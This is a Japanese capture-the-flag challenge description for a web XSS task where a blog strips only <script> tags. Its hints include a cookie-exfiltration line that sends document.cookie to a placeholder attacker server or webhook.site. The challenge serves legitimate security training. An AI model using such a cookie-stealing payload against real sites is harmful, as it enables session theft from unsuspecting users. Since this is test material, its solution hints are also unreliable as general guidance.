# Let's remove script tag

- 作問: ramdos
- ジャンル: Web
- 難易度: Lv.2
- スコア: 138.97
- 提出回数上限: 100回

XSS は危ないって聞いたので、`<script>` タグを除去しました。これで安全、ですよね？

- 配布ファイル: <https://files.cpctf.space/lets-remove-script-tag-8192404252eb95710779f6fc1a988d82131c75766684faaab987f1daea2192f2.zip>
- 被害者 bot: <https://blog-admin.web.cpctf.space>
- 問題サーバー: 「問題起動」セクションを確認してください。

この問題はユーザーごとに問題インスタンスを作成します。

## ヒント（解放済み）

被害者 bot に、任意の JavaScript コードを実行する方法は `<script>` タグ以外にも存在します。XSS Payload などで検索してみましょう。
被害者 bot にフラグ（cookie に入っています）を漏洩させる方法として、`fetch('https://{{あなたのサーバー}}/?c='+document.cookie)` する方法などがあります。サーバーをお持ちでない場合は <https://webhook.site> などを用いることが出来ます。

## Attachment

- `dist/` (source tree)
- `lets-remove-script-tag.zip` (original distribution)
